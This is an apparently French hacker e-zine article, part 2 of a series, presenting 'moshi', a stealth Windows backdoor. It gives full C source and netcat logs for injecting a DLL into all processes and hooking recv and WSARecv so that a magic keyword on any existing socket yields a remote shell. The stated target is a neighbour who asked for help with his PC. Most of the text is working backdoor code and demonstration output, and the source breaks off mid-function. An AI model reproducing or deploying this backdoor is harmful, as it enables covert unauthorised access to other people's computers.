@@ -1,0 +1,1344 @@
+                                               _                   _          _ _               _            
+                                              (_)                 | |        | | |             | |          
+     ___ _   _ _ __   ___ _ __ ___  ___  _ __  _  ___ ___      ___| |__   ___| | | ___ ___   __| | ___  __
+    / __| | | | '_ \ / _ \ '__/ __|/ _ \| '_ \| |/ __/ __|    / __| '_ \ / _ \ | |/ __/ _ \ / _` |/ _ \/ __|
+    \__ \ |_| | |_) |  __/ |  \__ \ (_) | | | | | (__\__ \    \__ \ | | |  __/ | | (_| (_) | (_| |  __/\__ \
+    |___/\__,_| .__/ \___|_|  |___/\___/|_| |_|_|\___|___/    |___/_| |_|\___|_|_|\___\___/ \__,_|\___||___/
+              | |                                         
+              |_|                                         
+                                _       _           _   _             
+                               (_)     (_)         | | (_)            
+                                _ _ __  _  ___  ___| |_ _  ___  _ __  
+                               | | '_ \| |/ _ \/ __| __| |/ _ \| '_ \ 
+                               | | | | | |  __/ (__| |_| | (_) | | | |          #2
+                               |_|_| |_| |\___|\___|\__|_|\___/|_| |_|
+                                      _/ |                            
+                                     |__/                             
+
+
+    -- [ supersonics shellcodes injection part-2
+
+
+
+[ 1 ] ... Présentation du cas
+
+ Dans ce cas de figure, on a la possibilité de deposer proprement une petite
+ backdoor sur l'ordinateur cible. Par exemple celui de Raoul de Bergerac, le
+ voisin du dessus qui fait du bruit le soir et qui a eu la naive idee de vous
+ appeller a l'aide pour son pc plante.
+
+ Mais Raoul, attention hein, c'est pas n'importe qui. Il va au club informatique
+ du quartier, il a installe Norton Antivirus, et en plus il a lu dans Micro Hebdo
+ qu'on pouvait surveiller ce qui se passe sur son PC. Raoul, il a un script batch
+ qu'il lance de temps en temps. Il parrait que le chemin vers l'intelligence passe
+ par la paranoia :
+
+     Ra0u1.bat
+          @echo off
+          echo Recuperation des informations
+          date /t >> log.txt
+          tasklist >> log.txt
+          netstat -an >> log.txt
+          echo Travail terminé
+
+ On a donc un ordinateur facilement accessible mais sous la vigilance relative
+ d'un utilisateur un tant soi peu éveillé. Des approches trop grossières ne sont
+ donc pas possibles. L'ordinateur de Raoul fait tourner très peu de services, on
+ part du principe qu'il n'a pas de serveur exploitable. Par contre il est sur le
+ net sans firewall, Micro Hebdo a dit que Norton Antivirus c'est bien mais comme
+ ils n'ont pas parlé de firewall, Raoul il connait pas. Mais parfois il se rend
+ sur des pages ouebs qui scannent ses ports, pour voir...
+
+
+[ 2 ] ... Ebauche de solution
+
+ Bon, nous voila bien. Comment planquer une backdoor dans ce bordel ? Si on se
+ sert d'un grand classique comme netcat, Raoul va le repérer. Et si on lui donne
+ un nom "a la systeme", Raoul va tout de meme voir que ce programme n'etait pas
+ la auparavant. Méthode à exclure.
+
+ Pour qu'un programme s'exécute furtivement, on a grosso modo deux approches :
+  * rootkiter le pc afin de cacher les programmes qui tournent. 
+  * injecter le code à exécuter dans un programme legitime.
+
+ Pour ce papier, je vais retenir la seconde option. Le code de la backdoor va
+ donc etre injecte dans d'autres processus pour que son execution soit camouflee.
+ Je ne vais pas trop m'emmerder non plus, je ne vais pas faire d'injection de code
+ mais utiliser une dll, ce qui sera plus simple a mettre en place. Ah, facilite
+ contre efficacite, un des plus vieux dilemnes du monde...
+
+ Bon ensuite, si on s'y prend mal, il y a toujours moyen de faire foirer le truc.
+ Si vous voyez, avec un netstat, que notepad.exe est branche sur le net, vous risquez
+ de faire la tete de quelqu'un qui a trouve un truc louche. Raoul c'est pareil. Il
+ ne voit pas plus loin que le bout de son nez, mais vous vous souvenez de son nom de
+ famille ? Hé oui, c'est un cap, c'est un pic, que dis-je c'est une peninsule !
+
+ Alors notre code injecte, soit il ne connecte pas au net, soit il ne faut pas que
+ ca se voie. Comment rendre les choses discretes ? Allez, au hasard, deux approches :
+  * ne s'en prendre qu'a des programmes qui ont deja des ports ouverts en attente
+  * essayer d'utiliser les sockets deja en service au lieu d'en creer
+
+ La premiere option est realisabe mais bien moins interessante et amusante que la
+ seconde. C'est vrai, tant qu'a s'injecter, autant pousser le concept a fond et
+ utiliser les sockets officiels a l'insu du processus legitime !
+
+ La backdoor furtive commence a se dessiner un peu :
+  * injection de code pour ne pas apparaitre dans la liste des taches
+  * detournement des sockets utilises par les processus
+
+
+
+[ 3 ] ... Etre partout sans etre nulle part
+
+ L'injection de code via DLL est un sujet largement documente. Je ne vais pas decrire
+ cette section en detail. Un petit resume suffira.
+ 
+ On va recuperer les pids de tous les processus en cours. Dans chacun, on va allouer
+ une zone de memoire et y copier un bref petit code, le dll loader. Puis on fait
+ executer ce code par le processus en creant un nouveau thread qui débutera la. Le
+ loader va charger la dll dans l'espace d'adressage du processus et se charger de 
+ l'initialisation.
+
+ Pour assurer un controle durable sur le systeme, il faut prendre garde de hooker
+ quelques apis. Le code injecte a en effet besoin de surveiller certains comportements
+ des porgrammes. Et surveiller c'est hooker :
+  * CreateProcess, afin de s'injecter dans tout processus nouvellement cree
+  * FreeLibrary, afin d'interdire au processus de decharger la DLL
+
+ Hop ca y est c'est, on a le controle sur les processus du systeme. J'espere que vous
+ ne serez pas trop frustre par la rapidite de ce chapitre. Encore une fois, le sujet
+ est deja beaucoup traite, et le plus amusant reste a venir.
+
+
+ Dans beaucoup de fonctions de ce projet, on utilise des apis reseau de winsock. Or on
+ ne peut pas les utiliser directement ! En effet, vu qu'on s'injecte dans tous les process
+ on n'est pas certain que ce process ait winsock dans son espace d'adressage ! Et si on
+ charge en force, systematiquement, winsock dans tous les processus, bah on fait un boulot
+ plutot pas tres propre.
+
+ La solution adoptee est de regarder si winsock est chargee. Si elle ne l'est pas, on n'a
+ rien a faire dans ce processus, si ce n'est surveiller au cas ou le fourbe animal s'aviserait
+ de charger la dll plus tard au cours de son fonctionnement.
+
+ Si windock est present, on recupere les adresses des APIs qu'on va utiliser. Ainsi chargees
+ dynamiquement lorsque c'est possible, on a resolu notre probleme.
+
+
+
+[ 4 ] ... Moshi moshi
+
+ On en est venu à l'idee que la backdoor la plus furtive possible ne devait ouvrir
+ aucun port, et que pour ca on allait jouer a manipuler les sockets deja ouverts par
+ les applications dans lesquelles on s'injecte.
+
+ Pour ca, on va commencer par poser un hook sur l'api ws2_32:recv. Notre nouveau
+ petit handler va d'abord executer l'ancien appel, puis vérifier le contenu du buffer.
+ Si le buffer contient le mot clef, alors on agit ! On renvoie un shell sur ce socket,
+ et a la fin de l'execution du shell on renvoie un message de socket error.
+
+ Simple et efficace. Quelques tests anec NetCat s'imposent. Le premier netcat sera le
+ serveur, qui ecoutera le port 80 facon serveur web. Le second netcat sera le client.
+ Dans ce premier test, le client est sous le controle de l'attaquant et envoie le 
+ mot-clef à un serveur corrompu par moshi afin d'obtenir un shell :
+
+ Premier netcat                 |     	Second netcat
+ nc -vv -l -p 80		|	
+ listening on [any] 80 ...	|
+				|
+				|	nc -vv localhost 80
+				+-----------------------+
+ DNS fwd/rev mismatch: localhost != vmware              |
+ connect to [127.0.0.1] from localhost [127.0.0.1] 1056 |
+				+-----------------------+
+				|
+				|	DNS fwd/rev mismatch: vmware != localhost
+				|	vmware [127.0.0.1] 80 (http) open
+				|
+				|	TAPE : get pageweb
+ RECU : get pageweb		|
+ TAPE : return pageweb		|
+				|	RECU : return pageweb
+				|	TAPE : tolwin
+ RECU : rien de visible !	|
+				|	Microsoft Windows XP [version 5.1.2600]
+				|	(C) Copyright 1985-2001 Microsoft Corp.
+				|	
+				|	C:\>dir
+ RECU : rien de visible !	|
+				|	dir
+				|	 Le volume dans le lecteur C n'a pas de nom.
+				|	 Le numéro de série du volume est 14F6-33E2
+				|	
+				|	 Répertoire de C:\
+				|
+				|	27/02/2005  20:58            45 056 aa.exe
+				|	11/02/2005  14:13                 0 AUTOEXEC.BAT
+				|	11/02/2005  14:13                 0 CONFIG.SYS
+				|	11/02/2005  14:33    <REP>          Documents and Settings
+				|	27/02/2005  21:00            59 392 nc.exe
+				|	03/03/2005  10:13            61 440 progmon.dll
+				|	11/02/2005  14:33    <REP>          Program Files
+				|	03/03/2005  10:13            49 466 status.txt
+				|	11/02/2005  14:32    <REP>          WINDOWS
+				|	               6 fichier(s)          215 354 octets
+				|	               3 Rép(s)   2 820 456 448 octets libres
+				|
+				|	C:\>exit
+ RECU : rien de visible !	|
+				|
+ sent 15, rcvd 12: NOTSOCK	|	sent 28, rcvd 775: NOTSOCK
+				|
+
+
+
+
+
+ Dans ce second cas, les acteurs sont les même. Mais ce coup-ci, le serveur est bidon
+ et sous le controle de l'attaquant, qui l'utilise pour envoyer le mot-clef au client
+ corrompu par moshi :
+
+ Premier netcat                 |     	Second netcat
+ nc -vv -l -p 80		|	
+ listening on [any] 80 ...	|
+				|
+				|	nc -vv localhost 80
+				+-----------------------+
+ DNS fwd/rev mismatch: localhost != vmware              |
+ connect to [127.0.0.1] from localhost [127.0.0.1] 1056 |
+				+-----------------------+
+				|
+				|	DNS fwd/rev mismatch: vmware != localhost
+				|	vmware [127.0.0.1] 80 (http) open
+				|
+				|	TAPE : get pageweb
+ RECU : get pageweb		|
+ TAPE : return pageweb		|
+				|	RECU : return pageweb
+				|	TAPE : get pageweb2
+ RECU : get pageweb2		|
+ TAPE : tolwin			|
+				|	RECU : rien !
+				+--------------------------+
+Microsoft Windows XP [version 5.1.2600]			   |
+(C) Copyright 1985-2001 Microsoft Corp.			   |
+							   |
+C:\>dir							   | RECU : rien !
+dir							   |
+ Le volume dans le lecteur C n'a pas de nom.		   |
+ Le numéro de série du volume est 14F6-33E2		   |
+						 	   |
+ Répertoire de C:\					   |
+							   |
+27/02/2005  20:58            45 056 aa.exe                 |
+11/02/2005  14:13                 0 AUTOEXEC.BAT           |
+11/02/2005  14:13                 0 CONFIG.SYS             |
+11/02/2005  14:33    <REP>          Documents and Settings |
+27/02/2005  21:00            59 392 nc.exe		   |
+03/03/2005  10:13            61 440 progmon.dll		   |
+11/02/2005  14:33    <REP>          Program Files	   |
+03/03/2005  10:20            92 375 status.txt		   |
+11/02/2005  14:32    <REP>          WINDOWS                |
+               6 fichier(s)          258 263 octets	   |
+               3 Rép(s)   2 820 374 528 octets libres	   |
+				+--------------------------+
+C:\>exit			|	RECU : rien !
+				|
+ sent 16, rcvd 773		|	sent 13, rcvd 0: NOTSOCK
+				|
+
+
+ 
+ Petit compte rendu des observations :
+ 
+ Le netcat qui renvoie le shell ne voit pas du tout passer le mot-clef, ni les commandes
+ du shell. Cette furtivité est toute relative, mais elle evite quand meme de laisser des
+ traces trop visibles comme par exemple dans les logs de serveurs ftp, web etc etc...
+
+
+ Voici le code du detour de recv. C'est tout court et tout simple.
+
+int _stdcall NewRecv (int s,char FAR* buf,int len,int flags)
+	{
+		int return_val;
+
+		// recv d'origine
+		__asm
+		{
+			push dword ptr [ebp+14h]
+			push dword ptr [ebp+10h]
+			push dword ptr [ebp+0Ch]
+			push dword ptr [ebp+8]
+
+			call backup_api_recv
+			mov return_val,eax
+		}
+
+		// Regarde ma condition
+		if ( !strncmp(buf,mot_de_passe,strlen(mot_de_passe)) )
+		{
+			_snprintf((char*)debug_string,2048, "% 20s - recv detecte magic key\n",GetNameByPID(GetCurrentProcessId()));
+			send_debug ((char*)debug_string);
+			//Lance le shell
+			doexec(s);
+			//Règle l'erreur et cassos
+			import_wsasetlasterror(WSAECONNRESET);import_closesocket(s);return SOCKET_ERROR ;
+		}
+
+		// Sinon, comme si de rien n'etait
+		return return_val;
+	}	
+
+
+ Pour le fun, voici la trace d'un netcat se faisant passer pour un serveur web. Le pauvre
+ et innocent Mozilla Firefox contaminé se fait croquer et renvoie un shell !
+
+C:\>nc -vv -l -p 80
+listening on [any] 80 ...
+DNS fwd/rev mismatch: localhost != ordilolo
+connect to [127.0.0.1] from localhost [127.0.0.1] 3997
+GET / HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-FR; rv:1.7.5) Gecko/2004
+1108 Firefox/1.0
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plai
+n;q=0.8,image/png,*/*;q=0.5
+Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+
+tolwin
+Microsoft Windows XP [version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Tolwin>exit
+ sent 12, rcvd 533
+
+
+
+
+
+[ 4 ] ... Vous avez parle de repondeur automatique ?
+
+ Sous Windows, il n'y a pas besoin de faire tourner des tonnes de serveurs pour avoir
+ quantite de ports deja ouverts sur sa machine :
+
+C:\>netstat -a -n -p TCP
+
+Connexions actives
+
+  Proto  Adresse locale         Adresse distante       Etat
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:5000           0.0.0.0:0              LISTENING
+  TCP    192.168.1.110:139      0.0.0.0:0              LISTENING
+  TCP    192.168.1.110:1043     192.168.1.2:80         TIME_WAIT
+  TCP    192.168.1.110:1044     192.168.1.2:80         TIME_WAIT
+  TCP    192.168.1.110:1048     192.168.1.2:80         TIME_WAIT
+  TCP    192.168.1.110:1049     192.168.1.2:80         TIME_WAIT
+  TCP    192.168.1.110:1051     192.168.1.2:80         TIME_WAIT
+  TCP    192.168.1.110:1058     192.168.1.2:80         TIME_WAIT
+  TCP    192.168.1.110:1059     192.168.1.2:80         TIME_WAIT
+  TCP    192.168.1.110:1063     192.168.1.2:80         TIME_WAIT
+  TCP    192.168.1.110:1064     192.168.1.2:80         TIME_WAIT
+  TCP    192.168.1.110:1066     192.168.1.2:80         TIME_WAIT
+  TCP    192.168.1.110:1069     192.168.1.2:80         TIME_WAIT
+  TCP    192.168.1.110:1070     192.168.1.2:80         TIME_WAIT 
+
+
+
+ Nouveau scenario : un pc est compromis par moshi. En se connectant a un port de base
+ comme 135, peut-on recevoir un shell en envoyant le mot de passe ?
+
+	nc localhost 135
+	tolwin
+	aaa
+	tolwin
+	^C
+	C:\>
+
+
+ Non, rien a faire, pas de shell. Et pourquoi donc, dis ? Recv n'est pas la seule API
+ reseau a faire de la reception d'information via le reseau. Windows propose au programmeur
+ l'API WSARecv, qui lui est specifique. WSARecv permet de balancer plusieurs requettes recv
+ sur un meme socket, a la barbare, sans attendre. Il faut fournir a l'API un tableau de buffers.
+ La premierre requete lancee ira ecrire dans le buffer 1, la seconde dans le buffer 2 etc...
+ Le hook de WSARecv demande donc de regarder combien de buffers sont possible, et de verifier
+ chacun.
+
+ Sinun hook de WSARecv est mis en place, tous les teves deviennent envisageables. Ah, Raoul,
+ si tu savais... Mais entre reve et realite, il y a un monde ! Alors, testons :
+
+C:\>nc localhost 135
+aa
+tolwin
+Microsoft Windows XP [version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>exit
+
+
+C:\WINDOWS\system32>exit
+Connection terminee
+Ctrl-C peut etre necessaire pour quiter
+^C
+C:\>
+
+ Tadaa !!! C'est au poil. Le hook de WSARecv est plus technique que celui de recv. Il y a
+ plusieurs cas de figure :
+
+ * WSASocket n'est pas utilise en OverlappedIO et se termine tout de soute
+   On n'a alors qu'un seul buffer a verifier, et l'adresse du buffer pointe sur son debut.
+   Ce cas de figure ressemble beaucoup à recv.
+ * WSASocket est utilise en overlappedIO, il peut y avoir plusieurs buffer a examiner. En
+   plus, l'adresse du buffer pointe souvent APRES les donnees recues. Il faut donc rechercher
+   le mot clef a l'offset mais aussi avant l'offset.
+
+ Bref, c'est un joyeux bordel. Mais ca tourne.
+
+int _stdcall NewWSARecv (SOCKET s,LPWSABUF lpBuffers,DWORD dwBufferCount,LPDWORD lpNumberOfBytesRecvd,LPDWORD lpFlags,LPWSAOVERLAPPED lpOverlapped,LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
+	{
+		int return_val;
+		DWORD taille_mot_de_passe = strlen(mot_de_passe);
+
+		// Ancien appel
+		__asm
+		{
+			push dword ptr [ebp+20h]
+			push dword ptr [ebp+1Ch]
+			push dword ptr [ebp+18h]
+			push dword ptr [ebp+14h]
+			push dword ptr [ebp+10h]
+			push dword ptr [ebp+0Ch]
+			push dword ptr [ebp+8]
+			
+			call backup_api_wsarecv
+			mov return_val,eax
+		}
+
+		// WSARecv renvoie 0 : pas d'erreur et la fx termine immediatement -----------
+		// Code de retour zero et pas overlap ----------------------------------------
+		if ( (return_val == 0) && (lpOverlapped == NULL) )
+		{
+			//Si buffer non nul et réception de la bonne taille
+			if ( (lpBuffers != NULL) && (lpBuffers->buf != NULL) && (*lpNumberOfBytesRecvd == taille_mot_de_passe) )
+			{
+				// Compare la chaine
+				bool verdict = true;
+				for(DWORD i = 0; i < taille_mot_de_passe;i++)
+					if (lpBuffers->buf[i] != mot_de_passe[i])
+						{verdict = false;break;}
+	
+				// Si comparaison ok lance le shell
+				if (verdict)
+				{
+					// Efface le buffer et lance le shell
+					_snprintf((char*)debug_string,2048, "% 20s - WSARecv (ok / non-overlap) detecte magic key\n",GetNameByPID(GetCurrentProcessId()));
+					send_debug ((char*)debug_string);
+	
+					for(i = 0; i < taille_mot_de_passe;i++)
+						lpBuffers->buf[i] = 0;
+				
+					doexec(s);
+
+					// Rend le socket invalide et cassos
+					import_wsasetlasterror(WSAECONNRESET);
+					import_closesocket(s);
+					return SOCKET_ERROR;
+				}
+			}	
+		}
+	
+		// Autre cas : erreur ou WSA IO PENDING -----------------------------------------
+		else if ( (return_val == -1 ) && (import_wsagetlasterror() == WSA_IO_PENDING) )
+		{
+			bool verdict;
+			bool premiere_passe;
+
+			_snprintf((char*)debug_string,2048, "% 20s - WSARecv %d buffers\n",GetNameByPID(GetCurrentProcessId()), dwBufferCount);
+			send_debug ((char*)debug_string);
+			_snprintf((char*)debug_string,2048, "% 20s - WSARecv completion routine 0x%08X\n",GetNameByPID(GetCurrentProcessId()), lpCompletionRoutine);
+			send_debug ((char*)debug_string);
+
+			//Compare à l'offset sur le buffer 1
+			DWORD le_bon_buffer;
+			verdict = true;
+			for (le_bon_buffer = 0; le_bon_buffer < dwBufferCount;le_bon_buffer++)
+			{
+				premiere_passe = true;
+				
+				for(DWORD i = 0; i < taille_mot_de_passe;i++)
+					if (lpBuffers[le_bon_buffer].buf[i] != mot_de_passe[i])
+						{verdict = false;break;}
+
+				//Si non, compare pre-offset
+				if (!verdict)
+				{
+					verdict = true;
+					premiere_passe = false;
+					for(DWORD i = 0; i < taille_mot_de_passe;i++)
+						if (lpBuffers[le_bon_buffer].buf[i-taille_mot_de_passe] != mot_de_passe[i])
+							{verdict = false;break;}
+				}
+
+				if (verdict)
+					break;
+			}
+
+			if (verdict)
+			{
+				// Efface le buffer et lance le shell
+				_snprintf((char*)debug_string,2048, "% 20s - WSARecv (err / pending) detecte magic key\n",GetNameByPID(GetCurrentProcessId()));
+				send_debug ((char*)debug_string);
+				
+				if (premiere_passe)
+					for(DWORD i = 0; i < taille_mot_de_passe;i++)
+						lpBuffers[le_bon_buffer].buf[i] = 0;
+				else
+					for(DWORD i = 0; i < taille_mot_de_passe;i++)
+						lpBuffers[le_bon_buffer].buf[i-taille_mot_de_passe] = 0;
+
+				doexec(s);
+		
+				// Rend le socket invalide et cassos
+				char message_fin[] = "Connection terminee\nCtrl-C peut etre necessaire pour quiter\n";
+				import_send(s, message_fin, strlen(message_fin), 0);
+
+				*lpNumberOfBytesRecvd = 0;
+				import_wsasetlasterror(WSA_IO_PENDING);
+				return SOCKET_ERROR;
+			}
+		}
+	
+		// Sinon, comme si de rien n'etait
+		return return_val;
+	}
+
+ La reponse sur le port 135 marche avec mon windows xp non patche sous vmware mais echoue
+ avec windows SP2. La question reste a etudier.
+
+
+
+
+
+[ 5 ] ... Que reste-t-il a faire ?
+
+ Le code est efficace et discret. Pour ameliorer la furtivite de l'ensemble, quelques petites
+ choses, et quelques moins petites choses restent a voir :
+
+ * virer cette dll puante, proceder par injection directe de code. Pas grand chose a faire
+   avec un compilo assembleur, mais sous VC++ pour avoir des infos fiables sur la longueur
+   et l'emplacement d'une fonction, c'est pas gagné. Pour faire clair j'ai table sur un
+   exemple en C, donc DLL parasite. Si le coeur vous en dit, a vos compilos asm !!!
+
+ * rootkitiser un peu le truc : planquer le fichier de la dll, filtrer le listage des modules.
+   Mais des le debut je voulais l'exemple leger alors pas de melange des genres. J'ai cible
+   ce papier sur une application reseau de l'API hooking, pas sur du rootkiting de furtivite.
+
+ * ameliorer le shell, include des macrocommandes de telechargement de fichier etc...
+
+ * verifier dans wininet si il n'y a pas des APIs a hooker. Et il y en a surement, vu que
+   wininet gere la communication reseau a plus haut niveau. Les applications clientes utilisant
+   l'API wininet au lieu de winsock ne seront pas abusables par un serveur sous le controle
+   de l'agresseur. Je ne crois pas qu'il y ait d'APIs de haut niveau serveur-side dans
+   wininet mais j'avoue, j'ai fait ma faignasse et j'ai pas vérifié :p
+
+
+
+[ 6 ] ... La version proposee
+
+ La version compilee proposee avec ce papier a ces limitations :
+
+ * la dll, moshi.dll, DOIT etre dans c:\
+ * l'execution genere un fichier c:\status.txt. Ce fichier me servait pour le debug, mais comme
+   il est tout sauf discret je l'ai laisse pour que le pekin moyen ne puisse pas ravager le
+   net avec un outil qu'il ne comprend pas, c'est a dire qu'il ne peut pas refaire
+ * un loader de dll est fourni avec, aa.exe
+ * un netcat est fourni, pour pouvoir faire mumuse directement avec ce qu'il y a dans le petit
+   paquet. Enjoy !
+ * un exemple de fichier status.txt pour zieuter tranquile ce que ca donne
+
+
+
+[ 7 ] ... Idees de lecture
+ 
+ * Hacker Defender, pour avoir propose cette fonction et m'avoir
+   motive a la refaire pour piger.
+ * J'etend HxDef a tout rootkit.com, pour les furieux de la prog
+   musclee sous windows.
+ * NetCat, pour sa source de DoExec que j'ai refais a ma sauce.
+   Netcat, nmap, voila de la bonne lecture !
+ * Last Stage of Delirium, les assembly components sont un must
+ * Coup de coeur du moment : le white paper de eEye sur les 
+   boffers overflows dans le kernel. Delicieux.
+ * Zombie pour son moteur de desassemblage, et tant de sources
+
+
+ * Une pensee pour Raoul, qui a morfle severe durant cette aventure ;)
+
+
+	- Annexe :
+pour obtenir le programme en entier, direction annexe du mag.
+
+
+
+
+
+
+		######################
+		#  ws2_32_moshi.cpp  #
+		######################
+
+
+#include <winsock2.h>
+#include <stdio.h>
+
+#include "hook_utils.h"
+#include "server.h"
+#include "doexec.h"
+
+
+//MAGIC KEY
+char mot_de_passe[] = "tolwin\n";
+
+//Quelques imports
+extern char* debug_string[2049];
+extern bool ALLOW_OUTBOUND;
+
+
+//import de fonctions de ws2_32 qu'on va utiliser
+typedef int          (WINAPI *type_send) (SOCKET,const char FAR * ,int,int);
+type_send            import_send = NULL;
+typedef int          (WINAPI *type_recv) (SOCKET,char FAR*,int,int);
+type_recv            import_recv = NULL;
+typedef int          (WINAPI *type_closesocket) (SOCKET);
+type_closesocket     import_closesocket = NULL;
+typedef void         (WINAPI *type_wsasetlasterror) (int);
+type_wsasetlasterror import_wsasetlasterror = NULL;
+typedef int          (WINAPI *type_wsagetlasterror) (void);
+type_wsagetlasterror import_wsagetlasterror = NULL;
+
+
+//Les infos pour les APIS injectées :
+int _stdcall NewRecv (int s, char FAR* buf, int len, int flags);
+char* backup_api_recv = NULL;
+
+int _stdcall NewWSARecv (SOCKET s,LPWSABUF lpBuffers,DWORD dwBufferCount,LPDWORD lpNumberOfBytesRecvd,LPDWORD lpFlags,LPWSAOVERLAPPED lpOverlapped,LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionROUTINE);
+char* backup_api_wsarecv = NULL;
+
+
+
+
+int importe_fx ()
+	{
+		// Chope les fx qu'on utilisera
+		HMODULE adresse_ws2_32;
+		if ((adresse_ws2_32 = GetModuleHandle("ws2_32.dll")) == 0)	return FALSE;
+		if ((import_send = (type_send) GetProcAddress(adresse_ws2_32,"send")) == 0) return FALSE;
+		if ((import_recv = (type_recv) GetProcAddress(adresse_ws2_32,"recv")) == 0) return FALSE;
+		if ((import_closesocket = (type_closesocket) GetProcAddress(adresse_ws2_32,"closesocket")) == 0) return FALSE;
+		if ((import_wsasetlasterror = (type_wsasetlasterror) GetProcAddress(adresse_ws2_32,"WSASetLastError")) == 0) return FALSE;
+		if ((import_wsagetlasterror = (type_wsagetlasterror) GetProcAddress(adresse_ws2_32,"WSAGetLastError")) == 0) return FALSE;
+		
+		return TRUE;
+	}
+
+
+
+
+// -----------------------------------------------------------------------------------------------------------------------
+// FONCTIONS PUBLIQUES : HOOK ET DEHOOK ----------------------------------------------------------------------------------
+// -----------------------------------------------------------------------------------------------------------------------
+int WINAPI hook_ws2_32 ()
+	{
+		// Chope les fx qu'on utilisera
+		DWORD offset_new_fx;
+		
+		_snprintf((char*)debug_string,2048, "% 20s - ws2_32.dll hook\n",GetNameByPID(GetCurrentProcessId()));
+		send_debug ((char*)debug_string);
+		
+		importe_fx ();
+		
+						
+		// Hook de recv
+		__asm lea eax,NewRecv
+		__asm mov offset_new_fx,eax
+		if (!backup_api_recv)
+			initialise_hook("WS2_32.dll", "recv",    offset_new_fx,    &backup_api_recv   );
+
+		if (backup_api_recv)
+		{
+			_snprintf((char*)debug_string,2048, "% 20s - ws2_32.dll:recv hook succes\n",GetNameByPID(GetCurrentProcessId()));
+			send_debug ((char*)debug_string);
+		}
+		else
+		{
+			_snprintf((char*)debug_string,2048, "% 20s - ws2_32.dll:recv hook echec\n",GetNameByPID(GetCurrentProcessId()));
+			send_debug ((char*)debug_string);
+		}
+
+		// Hook de WSARecv
+		__asm lea eax,NewWSARecv
+		__asm mov offset_new_fx,eax
+		if (!backup_api_wsarecv)
+			initialise_hook("WS2_32.dll", "WSARecv", offset_new_fx, &backup_api_wsarecv);
+
+		if (backup_api_wsarecv)
+		{
+			_snprintf((char*)debug_string,2048, "% 20s - ws2_32.dll:WSARecv hook succes\n",GetNameByPID(GetCurrentProcessId()));
+			send_debug ((char*)debug_string);
+		}
+		else
+		{
+			_snprintf((char*)debug_string,2048, "% 20s - ws2_32.dll:WSARecv hook echec\n",GetNameByPID(GetCurrentProcessId()));
+			send_debug ((char*)debug_string);
+		}
+		
+
+		// Fin
+		return TRUE;
+	}
+
+
+
+int WINAPI free_ws2_32 ()
+	{
+		if (backup_api_recv)
+			enleve_hook("WS2_32.dll", "recv",    &backup_api_recv    );
+
+		if (backup_api_wsarecv)
+			enleve_hook("WS2_32.dll", "WSARecv", &backup_api_wsarecv );
+		
+
+		// Fin
+		return TRUE;
+	}
+
+
+// -----------------------------------------------------------------------------------------------------------------------
+// FONCTIONS PRIVEES : NOUVEAUX HANDLERS ---------------------------------------------------------------------------------
+// -----------------------------------------------------------------------------------------------------------------------
+
+// Nouveau handler pour RECV
+int _stdcall NewRecv (int s,char FAR* buf,int len,int flags)
+	{
+		int return_val;
+
+		// recv d'origine
+		__asm
+		{
+			push dword ptr [ebp+14h]
+			push dword ptr [ebp+10h]
+			push dword ptr [ebp+0Ch]
+			push dword ptr [ebp+8]
+
+			call backup_api_recv
+			mov return_val,eax
+		}
+
+		// Regarde ma condition
+		if ( !strncmp(buf,mot_de_passe,strlen(mot_de_passe)) )
+		{
+			_snprintf((char*)debug_string,2048, "% 20s - recv detecte magic key\n",GetNameByPID(GetCurrentProcessId()));
+			send_debug ((char*)debug_string);
+			//Lance le shell
+			doexec(s);
+			//Règle l'erreur et cassos
+			import_wsasetlasterror(WSAECONNRESET);import_closesocket(s);return SOCKET_ERROR ;
+		}
+
+		// Sinon, comme si de rien n'etait
+		return return_val;
+	}	
+
+	
+// Nouveau handler pour WSARECV
+/*
+lpBuffers
+    [in, out] Pointer to an array of WSABUF structures. Each WSABUF structure contains a pointer to a buffer and the length of the buffer, in bytes.
+typedef struct __WSABUF {
+  u_long len;
+  char FAR* buf;
+} WSABUF, 
+*LPWSABUF;
+*/
+
+int _stdcall NewWSARecv (SOCKET s,LPWSABUF lpBuffers,DWORD dwBufferCount,LPDWORD lpNumberOfBytesRecvd,LPDWORD lpFlags,LPWSAOVERLAPPED lpOverlapped,LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
+	{
+		int return_val;
+		DWORD taille_mot_de_passe = strlen(mot_de_passe);
+
+		// Ancien appel
+		__asm
+		{
+			push dword ptr [ebp+20h]
+			push dword ptr [ebp+1Ch]
+			push dword ptr [ebp+18h]
+			push dword ptr [ebp+14h]
+			push dword ptr [ebp+10h]
+			push dword ptr [ebp+0Ch]
+			push dword ptr [ebp+8]
+			
+			call backup_api_wsarecv
+			mov return_val,eax
+		}
+
+		// WSARecv renvoie 0 : pas d'erreur et la fx termine immediatement -----------
+		// Code de retour zero et pas overlap ----------------------------------------
+		if ( (return_val == 0) && (lpOverlapped == NULL) )
+		{
+			//Si buffer non nul et réception de la bonne taille
+			if ( (lpBuffers != NULL) && (lpBuffers->buf != NULL) && (*lpNumberOfBytesRecvd == taille_mot_de_passe) )
+			{
+				// Compare la chaine
+				bool verdict = true;
+				for(DWORD i = 0; i < taille_mot_de_passe;i++)
+					if (lpBuffers->buf[i] != mot_de_passe[i])
+						{verdict = false;break;}
+	
+				// Si comparaison ok lance le shell
+				if (verdict)
+				{
+					// Efface le buffer et lance le shell
+					_snprintf((char*)debug_string,2048, "% 20s - WSARecv (ok / non-overlap) detecte magic key\n",GetNameByPID(GetCurrentProcessId()));
+					send_debug ((char*)debug_string);
+	
+					for(i = 0; i < taille_mot_de_passe;i++)
+						lpBuffers->buf[i] = 0;
+				
+					doexec(s);
+
+					// Rend le socket invalide et cassos
+					import_wsasetlasterror(WSAECONNRESET);
+					import_closesocket(s);
